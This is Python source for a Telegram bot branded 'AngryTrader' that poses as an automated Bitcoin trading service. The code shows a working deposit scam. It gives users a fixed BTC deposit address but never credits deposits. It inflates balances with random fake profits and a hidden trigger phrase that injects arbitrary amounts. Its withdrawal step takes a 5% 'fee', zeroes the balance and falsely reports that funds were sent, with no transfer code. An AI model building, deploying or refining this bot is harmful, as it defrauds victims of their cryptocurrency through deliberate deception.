import os
import random
import asyncio
import requests
from aiohttp import web

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
    Update
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is not set")

SECRET_INJECT_TRIGGER = "🦍 banana_mode_69420"

user_balances = {}
user_states = {}
pending_inject = {}
pending_withdrawal = {}

def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Balance", callback_data='balance')],
        [
            InlineKeyboardButton("📤 Withdrawal", callback_data='withdrawal'),
            InlineKeyboardButton("📥 Deposit", callback_data='deposit'),
        ],
        [
            InlineKeyboardButton("▶️ Run", callback_data='run'),
            InlineKeyboardButton("⏹ Stop", callback_data='stop'),
        ],
        [
            InlineKeyboardButton("📊 Monitor", callback_data='monitor'),
            InlineKeyboardButton("🧠 Strategy", callback_data='strategy'),
        ],
        [InlineKeyboardButton("🚪 Exit", callback_data='exit')],
    ])

def get_strategy_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📈 Momentum", callback_data='strategy_momentum'),
            InlineKeyboardButton("📉 Mean Reversion", callback_data='strategy_mean'),
            InlineKeyboardButton("⚙️ Grid Trading", callback_data='strategy_grid'),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data='back_to_main')],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_balances.setdefault(user_id, 0.0)
    user_states.setdefault(user_id, {"running": False, "strategy": None})

    try:
        await update.message.reply_photo(
            photo=open("header.jpg", "rb"),
            caption="Welcome to AngryTrader"
        )
    except Exception as e:
        await update.message.reply_text("Welcome to AngryTrader (header.jpg failed)")

    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    user_id = query.from_user.id

    user_balances.setdefault(user_id, 0.0)
    user_states.setdefault(user_id, {"running": False, "strategy": None})

    balance = user_balances[user_id]
    state = user_states[user_id]

    if action == "exit":
        await query.edit_message_text("🚪 Session ended. Goodbye!")
        return

    elif action == "deposit":
        await query.edit_message_text(
            "💼 This is your deposit address (Minimum deposit: 0.001 BTC)",
            reply_markup=get_main_menu()
        )
        await query.message.reply_text(
            "`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`", parse_mode="Markdown"
        )
        return

    elif action == "balance":
        await query.edit_message_text(
            f"💰 Balance: {balance:.8f} BTC",
            reply_markup=get_main_menu()
        )
        return

    elif action == "withdrawal":
        if balance <= 0:
            await query.edit_message_text("❌ You can’t withdraw with 0 BTC.", reply_markup=get_main_menu())
        else:
            pending_withdrawal[user_id] = {'step': 1}
            await query.edit_message_text("💸 Enter the BTC address you want to withdraw to:")
        return

    elif action == "run":
        if balance <= 0:
            await query.edit_message_text("⚠️ No balance. Please deposit BTC to start trading.", reply_markup=get_main_menu())
        else:
            user_states[user_id]["running"] = True
            await query.edit_message_text(f"✅ Bot started with {balance:.8f} BTC.", reply_markup=get_main_menu())
        return

    elif action == "stop":
        user_states[user_id]["running"] = False
        await query.edit_message_text("⏹ Bot stopped.", reply_markup=get_main_menu())
        return

    elif action == "monitor":
        try:
            btc_price = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd"
            ).json()["bitcoin"]["usd"]
        except Exception:
            btc_price = "Error"

        is_running = "✅ Running" if state["running"] else "⛔️ Not Running"
        strategy = state["strategy"] or "None Selected"
        simulated_profit = "$0.00"  # Placeholder

        msg = (
            f"📊 *Trading Monitor*\n"
            f"------------------------\n"
            f"🧠 Strategy: {strategy}\n"
            f"🚦 Bot Status: {is_running}\n"
            f"💰 Balance: {balance:.8f} BTC\n"
            f"📈 BTC Price: ${btc_price}\n"
            f"📈 Simulated Profit: {simulated_profit}"
        )
        await query.edit_message_text(msg, reply_markup=get_main_menu(), parse_mode="Markdown")
        return

    elif action == "strategy":
        await query.edit_message_text("💡 Choose a strategy:", reply_markup=get_strategy_menu())
        return

    elif action == "strategy_momentum":
        user_states[user_id]["strategy"] = "Momentum"
        await query.edit_message_text(
            "📈 Momentum Strategy:\nBuys assets that trend up. Great in bull markets.",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "strategy_mean":
        user_states[user_id]["strategy"] = "Mean Reversion"
        await query.edit_message_text(
            "📉 Mean Reversion Strategy:\nBuy low, sell high. Assumes price returns to average.",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "strategy_grid":
        user_states[user_id]["strategy"] = "Grid Trading"
        await query.edit_message_text(
            "⚙️ Grid Trading:\nPlaces buy/sell orders at intervals. Works well in sideways markets.",
            reply_markup=get_strategy_menu()
        )
        return

    elif action == "back_to_main":
        await query.edit_message_text("Choose an option:", reply_markup=get_main_menu())
        return

    elif action == 'withdraw_confirm':
        wd = pending_withdrawal.get(user_id)
        if not wd or wd.get('step') != 2:
            await query.answer("No withdrawal in progress.", show_alert=True)
            return

        address = wd.get('address')
        fee = balance * 0.05
        net_amount = balance - fee
        user_balances[user_id] = 0.0
        pending_withdrawal.pop(user_id, None)

        await query.edit_message_text(
            f"✅ Withdrawal confirmed.\nSent {net_amount:.8f} BTC to:\n`{address}`\nFee: {fee:.8f} BTC",
            parse_mode="Markdown", reply_markup=get_main_menu()
        )
        return

    elif action == 'withdraw_cancel':
        pending_withdrawal.pop(user_id, None)
        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_main_menu())
        return

async def handle_secret_inject(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if text == SECRET_INJECT_TRIGGER:
        pending_inject[user_id] = True
        await update.message.reply_text("💰 Enter amount to inject:")
        return

    if user_id in pending_inject and pending_inject[user_id]:
        try:
            amount = float(text)
            user_balances[user_id] = user_balances.get(user_id, 0.0) + amount
            pending_inject[user_id] = False
            await update.message.reply_text(f"✅ Injected {amount:.8f} BTC.")
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Use format like `0.01`.")
        return

    if user_id in pending_withdrawal:
        step = pending_withdrawal[user_id].get('step', 0)
        if step == 1:
            address = text
            fee = user_balances[user_id] * 0.05
            net_amount = user_balances[user_id] - fee

            pending_withdrawal[user_id] = {
                'step': 2,
                'address': address
            }

            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ Confirm Withdrawal", callback_data='withdraw_confirm'),
                    InlineKeyboardButton("❌ Cancel", callback_data='withdraw_cancel')
                ]
            ])

            await update.message.reply_text(
                f"⚠️ Withdrawal Summary:\n\nAddress: `{address}`\nBalance: {user_balances[user_id]:.8f} BTC\nFee (5%): {fee:.8f} BTC\nNet: {net_amount:.8f} BTC",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )

async def profit_simulator_tick(context: ContextTypes.DEFAULT_TYPE):
    for user_id, state in user_states.items():
        if state.get("running"):
            profit = random.uniform(0.00001, 0.00005)
            user_balances[user_id] += profit

async def handle(request):
    return web.Response(text="OK")

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", "8000"))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"🌐 Web server running on port {port}")
    while True:
        await asyncio.sleep(3600)

async def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_secret_inject))
    application.job_queue.run_repeating(profit_simulator_tick, interval=5, first=5)

    await asyncio.gather(
        application.initialize(),
        run_webserver()
    )
    await application.run_polling()

if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
